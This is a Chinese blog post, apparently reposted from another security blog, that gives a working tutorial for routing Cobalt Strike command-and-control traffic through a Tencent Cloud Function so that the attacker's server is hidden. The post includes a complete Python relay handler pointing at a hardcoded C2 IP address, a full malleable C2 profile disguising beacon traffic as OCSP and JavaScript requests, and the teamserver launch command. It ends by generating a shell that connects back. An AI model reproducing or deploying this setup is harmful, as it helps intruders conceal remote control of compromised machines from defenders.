---
title: 利用腾讯云函数上线CS - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17085692.html
source: 博客园 - 渗透测试中心
date: 2023-02-03
fetch_date: 2025-10-04T05:35:05.453576
---

# 利用腾讯云函数上线CS - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [利用腾讯云函数上线CS](https://www.cnblogs.com/backlion/p/17085692.html "发布于 2023-02-02 13:11")

首先，我们需要登录腾讯云，开启云函数。
登录腾讯云后，搜索云函数。开通即可。
[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131053839-1216352589.png)](https://blog.bbskali.cn/usr/uploads/2023/01/2368181416.png)

初次登录，需要授权。
登录控制台后，点击新建。
[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131054602-470638784.png)](https://blog.bbskali.cn/usr/uploads/2023/01/1630847590.png)
函数名称随意，选择从头开始，环境填`Python3.6`，选完后下拉，把代码搞里头。
[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131055411-1076671042.png)](https://blog.bbskali.cn/usr/uploads/2023/01/114887848.png)
复制下面代码，并修改服务器地址。

```
# coding: utf8
import json,requests,base64
def main_handler(event, context):
    response = {}
    path = None
    headers = None
    try:
        C2='http://43.134.164.72:80'
        if 'path' in event.keys():
            path=event['path']
        if 'headers' in event.keys():
            headers=event['headers']
        if 'httpMethod' in event.keys() and event['httpMethod'] == 'GET' :
            resp=requests.get(C2+path,headers=headers,verify=False)
        else:
            resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
            print(resp.headers)
            print(resp.content)
        response={
            "isBase64Encoded": True,
            "statusCode": resp.status_code,
            "headers": dict(resp.headers),
            "body": str(base64.b64encode(resp.content))[2:-1]
        }
    except Exception as e:
        print('error')
        print(e)
    finally:
        return response
```

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131056155-704508693.png)](https://blog.bbskali.cn/usr/uploads/2023/01/3277247798.png)

完成后，点击保存！
接着点击触发管理，创建触发器
格式如下
[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131056987-2139775813.png)](https://blog.bbskali.cn/usr/uploads/2023/01/673256661.png)
点击api名称编辑后到达此页面，路径修改为`/`
[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131057639-1433818753.png)](https://blog.bbskali.cn/usr/uploads/2023/01/501732989.png)
完成 后点击 发布服务
新增C2的profile文件，命名为win\_tecent\_cloud\_func.profile

```
set sample_name "t";
set sleeptime "3000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

    set uri "/api/x";

    client {
        header "Accept" "*/*";
        metadata {
            base64;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Nodejs";
        output {
            base64;
            print;
        }
    }
}
http-stager {
    set uri_x86 "/vue.min.js";
    set uri_x64 "/bootstrap-2.min.js";
}
http-post {
    set uri "/api/y";
    client {
        header "Accept" "*/*";
        id {
            base64;
            prepend "JSESSION=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}
```

保存完成后，存放在cs目录下。
启动cs服务端

```
 ./teamserver vpsip admin12345 win_tecent_cloud_func.profile
```

[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131058388-1098289140.png)](https://blog.bbskali.cn/usr/uploads/2023/01/1833944843.png)

将云函数的公网接口地址域名填入listener的http hosts和stager的hosts
注意不要http 和80
[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131059002-1827516050.png)](https://blog.bbskali.cn/usr/uploads/2023/01/2661556786.png)
添加监听
[![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131059672-1097982904.png)](https://blog.bbskali.cn/usr/uploads/2023/01/3775039347.png)
生成shell后成功上线。
[![78.png](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230202131100358-2135063481.png "78.png")](https://blog.bbskali.cn/usr/uploads/2023/01/3188910683.png)

原文连接： https://blog.bbskali.cn/3771.html

posted @
2023-02-02 13:11
[渗透测试中心](https://www.cnblogs.com/backlion)
阅读(439)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202508/35695-20250830121216742-1062949948.jpg)](https://developer.huawei.com/consumer/cn/activity/digixActivity/digixcmsdetail/101750143863263087?ha_source=BKYQ3&ha_sourceId=89000408)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025